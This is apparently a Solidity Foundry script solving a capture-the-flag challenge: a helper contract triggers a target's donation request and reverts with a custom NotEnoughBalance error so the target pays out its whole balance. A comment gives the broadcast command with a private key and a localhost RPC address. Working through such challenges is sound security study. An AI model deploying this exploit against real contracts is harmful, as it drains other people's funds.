// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function requestDonation() external returns (bool enoughBalance);
}

contract Helper {
    bool public flag = false;
    error NotEnoughBalance();
    function trigger(address target) public {
        ITarget(target).requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10)
            revert NotEnoughBalance();
    }
}
contract SolveScript is Script {
    address public target = 0x330981485Dbd4EAcD7f14AD4e6A1324B48B09995;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.trigger(target);
        vm.stopBroadcast();
    }
}
